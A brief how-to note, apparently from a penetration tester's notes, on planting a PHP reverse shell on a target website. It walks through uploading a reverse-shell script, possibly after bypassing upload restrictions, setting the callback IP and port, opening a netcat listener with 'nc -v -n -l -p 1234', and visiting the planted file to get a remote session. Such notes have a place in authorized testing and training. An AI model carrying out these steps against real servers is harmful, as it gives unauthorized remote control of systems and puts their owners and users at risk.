Creating a PHP reverse shell

Use 'PHP Reverse Shell.php'

Upload the file to the server, possibly utilising techniques detailed in the 'Bypassing File Upload Restrictions'
manual

Change settings in the PHP file:

$ip = '127.0.0.1';
$port = 1234;       

Create a listener:

nc -v -n -l -p 1234

To run the shell, navigate to the website that you are targeting, adding '/php-reverse-shell' after the main address.

You should now have a session in the listener
